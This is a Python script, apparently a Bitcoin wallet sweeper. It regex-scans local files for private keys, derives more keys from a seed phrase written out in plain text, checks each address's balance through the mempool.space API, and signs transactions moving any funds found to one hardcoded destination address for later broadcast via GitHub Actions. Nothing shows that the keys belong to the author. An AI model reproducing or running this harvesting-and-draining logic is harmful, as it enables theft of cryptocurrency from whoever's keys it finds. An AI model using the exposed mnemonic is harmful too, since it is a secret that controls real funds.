import requests
import re
import time
from bitcoinlib.keys import Key, HDKey
from bitcoinlib.transactions import Transaction

def extract_potential_keys(filename):
    keys_found = []
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()
        # Captura WIFs (L, K, 5) e Hex (64 chars)
        keys_found.extend(re.findall(r'[LK5][1-9A-HJ-NP-Za-km-z]{50,51}', content))
        keys_found.extend(re.findall(r'\b[0-9a-fA-F]{64}\b', content))
    except: pass
    return list(set(keys_found))

def scan_total_compression():
    dest_address = '1E4FSo55XCjSDhpXBsRkB5o9f4fkVxGtcL'
    raw_keys = []
    files = ['privatekeys.txt', 'priv.key.rtf', 'chaves_extraidas_e_enderecos_1.txt', 'FDR_Master_Wallet_Complete_20251006_143555_2.csv']
    
    for f in files:
        raw_keys.extend(extract_potential_keys(f))

    # Inclui mnemônica corrigida
    try:
        phrase = "tree dwarf rubber off tree finger hair hope emerge earn friend such"
        master = HDKey.from_passphrase(phrase, network='bitcoin')
        for i in range(50):
            for path in [f"m/44'/0'/0'/0/{i}", f"m/84'/0'/0'/0/{i}"]:
                raw_keys.append(master.subkey_for_path(path).wif())
    except: pass

    raw_keys = list(set(raw_keys))
    print(f"Iniciando Varredura Atômica: {len(raw_keys)} chaves base.")

    for item in raw_keys:
        # Testamos a versão Comprimida e Não-Comprimida de cada chave
        for compressed in [True, False]:
            try:
                k = Key(item, network='bitcoin', compressed=compressed)
                # Formatos de endereço para cada estado de compressão
                formats = ['p2pkh', 'p2wpkh'] if compressed else ['p2pkh']
                
                for t_type in formats:
                    addr = k.address(witness_type=t_type)
                    
                    r = requests.get(f"https://mempool.space/api/address/{addr}/utxo", timeout=5)
                    if r.status_code == 200 and r.json():
                        utxos = r.json()
                        print(f"!!! SUCESSO ABSOLUTO !!! Saldo em {addr} (Compressed={compressed})")
                        
                        utxo = max(utxos, key=lambda x: x['value'])
                        fee = 70000 # Taxa de ultra-prioridade
                        amount = utxo['value'] - fee
                        
                        tx = Transaction(network='bitcoin')
                        tx.add_input(prev_txid=utxo['txid'], output_n=utxo['vout'], value=utxo['value'], address=addr)
                        tx.add_output(value=amount, address=dest_address)
                        tx.sign([k.wif()])
                        
                        hex_gen = tx.raw_hex()
                        print(f"HEX_GEN:{hex_gen}")
                        # O broadcast será feito pelo GitHub Actions conforme o YAML
                
                time.sleep(0.01)
            except: continue

if __name__ == "__main__":
    scan_total_compression()
